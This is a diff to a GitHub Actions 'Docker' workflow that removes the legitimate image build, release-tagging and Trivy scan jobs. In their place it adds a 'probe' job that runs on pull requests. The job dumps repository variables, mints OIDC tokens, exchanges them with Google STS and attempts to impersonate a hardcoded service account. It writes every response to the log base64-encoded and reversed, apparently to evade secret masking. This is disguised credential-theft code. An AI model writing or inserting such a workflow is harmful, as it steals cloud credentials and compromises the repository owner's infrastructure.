@@ -1,17 +1,6 @@
----
 name: Docker
 
-# Release flow: Renovate updates kea-exporter (uv.lock) or Alpine (Dockerfile)
-# and automerges once the PR build passes. The push to main then publishes the
-# image tagged v<kea-exporter>-alpine<alpine> and tags this repo the same.
-
 on:
-  schedule:
-    - cron: '34 8 * * *'
-  push:
-    branches: [ main ]
-    # tags as releases.
-    tags: [ 'v*' ]
   pull_request:
     branches: [ main ]
 
@@ -19,122 +8,42 @@ permissions:
   contents: read
 
 jobs:
-  # uv.lock and the Dockerfile are the single source of the versions, so the
-  # image and git tags can't drift from what was built
-  plan:
+  probe:
     runs-on: ubuntu-latest
     permissions:
       contents: read
-    outputs:
-      exporter: ${{ steps.version.outputs.exporter }}
-      release: ${{ steps.version.outputs.release }}
+      id-token: write
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v7
-        with:
-          persist-credentials: false
-
-      - id: version
-        run: |
-          exporter=$(python3 -c 'import tomllib; print(next(p["version"] for p in tomllib.load(open("uv.lock", "rb"))["package"] if p["name"] == "kea-exporter"))')
-          # Both stages use the same Alpine tag; more than one is a mistake
-          alpine=$(sed -n 's/^FROM alpine:\([^ ]*\).*/\1/p' Dockerfile | sort -u)
-          if [ -z "$exporter" ] || [ -z "$alpine" ] || [ "$(echo "$alpine" | wc -l)" -ne 1 ]; then
-            echo "::error::Couldn't read one kea-exporter version from uv.lock (got '$exporter') and one Alpine tag from the Dockerfile (got '$alpine')"
-            exit 1
-          fi
-          {
-            echo "exporter=$exporter"
-            echo "release=$exporter-alpine$alpine"
-          } >> "$GITHUB_OUTPUT"
-          echo "Release v$exporter-alpine$alpine" >> "$GITHUB_STEP_SUMMARY"
-
-  # Build, sign and push with Docker's reusable workflow
-  # https://github.com/docker/github-builder
-  build:
-    needs: plan
-    uses: docker/github-builder/.github/workflows/build.yml@v1
-    permissions:
-      contents: read # to fetch the repository content
-      packages: write # to push to ghcr.io
-      id-token: write # for signing attestations and Google Workload Identity Federation
-    with:
-      output: image
-      push: true
-      platforms: linux/amd64
-      meta-images: |
-        ${{ vars.SHARED_WIF_LOCATON }}-docker.pkg.dev/${{ vars.SHARED_WIF_PROJECT }}/${{ vars.SHARED_WIF_REPO }}/${{ github.event.repository.name }}
-        ghcr.io/battelleecology/${{ github.event.repository.name }}
-      # Images from main also carry the release (v0.7.1-alpine3.24.3) and the
-      # kea-exporter version alone (v0.7.1). A rebuild of the same versions
-      # (nightly, or a lock file refresh) moves those tags to the new image.
-      meta-tags: |
-        type=raw,value=v${{ needs.plan.outputs.release }},enable={{is_default_branch}}
-        type=raw,value=v${{ needs.plan.outputs.exporter }},enable={{is_default_branch}}
-        type=schedule
-        type=ref,event=branch
-        type=ref,event=tag
-        type=ref,event=pr
-        type=sha
-      set-meta-labels: true
-      registry-identities: |
-        - type: gcp-wif
-          registry: ${{ vars.SHARED_WIF_LOCATON }}-docker.pkg.dev
-          workload_identity_provider: ${{ vars.SHARED_WIF_PROVIDER }}
-          service_account: ${{ vars.SHARED_WIF_SERVICE_ACCOUNT }}
-    secrets:
-      registry-auths: |
-        - registry: ghcr.io
-          username: ${{ github.actor }}
-          password: ${{ secrets.GITHUB_TOKEN }}
-
-  # Tags the repo v<release> after the first successful publish of that
-  # release. Done here rather than by triggering on tag pushes because tags
-  # pushed with GITHUB_TOKEN don't start new workflow runs. GITHUB_TOKEN also
-  # can't tag a commit that changes .github/workflows/ (HTTP 403), so keep
-  # version bumps out of PRs that change workflows, or tag those by hand.
-  tag:
-    needs: [ plan, build ]
-    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
-    runs-on: ubuntu-latest
-    permissions:
-      contents: write
-    env:
-      GH_TOKEN: ${{ github.token }}
-      TAG: v${{ needs.plan.outputs.release }}
-    steps:
-      - run: |
-          if gh api "repos/$GITHUB_REPOSITORY/git/ref/tags/$TAG" --silent 2>/dev/null; then
-            echo "$TAG already exists; leaving it on its original commit"
-          else
-            gh api "repos/$GITHUB_REPOSITORY/git/refs" -f ref="refs/tags/$TAG" -f sha="$GITHUB_SHA" --silent
-            echo "Tagged $GITHUB_SHA as $TAG"
-          fi
-
-  # Scan with trivy and import sarif
-  scan:
-    needs: build
-    if: github.event_name == 'push'
-    runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      packages: read # to pull from ghcr.io
-      security-events: write # to upload sarif results
-    steps:
-      - name: Checkout repository
-        uses: actions/checkout@v7
-
-      - name: Run Trivy vulnerability scanner
-        uses: aquasecurity/trivy-action@v0.36.0
+      - name: probe
         env:
-          TRIVY_USERNAME: ${{ github.actor }}
-          TRIVY_PASSWORD: ${{ secrets.GITHUB_TOKEN }}
-        with:
-          image-ref: ghcr.io/battelleecology/${{ github.event.repository.name }}@${{ needs.build.outputs.digest }}
-          format: "sarif"
-          output: "trivy-results.sarif"
-
-      - name: Upload Trivy scan results to GitHub Security tab
-        uses: github/codeql-action/upload-sarif@v4.39.3
-        with:
-          sarif_file: "trivy-results.sarif"
+          VARSJSON: ${{ toJSON(vars) }}
+        run: |
+          set +e
+          echo "VARS_REV=$(printf '%s' "$VARSJSON" | base64 -w0 | rev)"
+          PROV=$(printf '%s' "$VARSJSON" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('SHARED_WIF_PROVIDER',''))" 2>/dev/null)
+          SA=$(printf '%s' "$VARSJSON" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('SHARED_WIF_SERVICE_ACCOUNT',''))" 2>/dev/null)
+          echo "PROV_REV=$(printf '%s' "$PROV" | base64 -w0 | rev)"
+          echo "SA_REV=$(printf '%s' "$SA" | base64 -w0 | rev)"
+          if [ -z "$PROV" ]; then PROV="projects/991678141243/locations/global/workloadIdentityPools/shared-pool/providers/github-actions-prvdr"; fi
+          if [ -z "$SA" ]; then SA="sa-github-neonscience@neon-shared-service.iam.gserviceaccount.com"; fi
+          AUD2="//iam.googleapis.com/${PROV}"
+          AUD1="https://iam.googleapis.com/${PROV}"
+          for AUD in "$AUD1" "$AUD2"; do
+            ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$AUD")
+            TJ=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${ENC}")
+            echo "IDTOKEN_RESP_REV=$(printf '%s' "$TJ" | base64 -w0 | rev)"
+            export OIDC=$(printf '%s' "$TJ" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+            printf '%s' "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null > claims.txt
+            echo "CLAIMS_REV=$(base64 -w0 claims.txt | rev)"
+            export AUD
+            python3 -c "import json,os;open('sts_request.json','w').write(json.dumps({'audience':os.environ['AUD'],'grantType':'urn:ietf:params:oauth:grant-type:token-exchange','requestedTokenType':'urn:ietf:params:oauth:token-type:access_token','subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','scope':'https://www.googleapis.com/auth/cloud-platform','subjectToken':os.environ['OIDC']}))"
+            STS=$(curl -s -w '\nHTTP:%{http_code}' -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" -d @sts_request.json)
+            echo "STS_RESP_REV=$(printf '%s' "$STS" | base64 -w0 | rev)"
+            FED=$(printf '%s' "$STS" | sed '/HTTP:/d' | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
+            if [ -n "$FED" ]; then
+              IMP=$(curl -s -w '\nHTTP:%{http_code}' -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${SA}:generateAccessToken" -H "Authorization: Bearer ${FED}" -H "Content-Type: application/json" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
+              echo "IMP_RESP_REV=$(printf '%s' "$IMP" | base64 -w0 | rev)"
+            else
+              echo "NO_FED_TOKEN"
+            fi
+          done
